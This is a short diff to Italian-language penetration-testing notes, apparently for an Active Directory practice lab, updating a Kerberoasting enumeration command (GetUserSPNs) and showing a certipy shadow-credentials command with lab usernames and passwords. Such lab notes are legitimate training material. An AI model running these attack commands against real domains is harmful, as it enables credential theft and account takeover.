@@ -278,5 +278,6 @@ certipy-ad shadow auto -u khal.drogo@essos.local -p 'horse' -account 'viserys.ta
 ### **ENUM MSSQL**
 Controlliamo se ci sono utenti con SPN sul server MSSQL
 ```bash
-GetUserSPNs.py north.sevenkingdoms.local/brandon.stark:iseedeadpeople
+impacket-GetUserSPNs north.sevenkingdoms.local/brandon.stark:iseedeadpeople
 ```
+
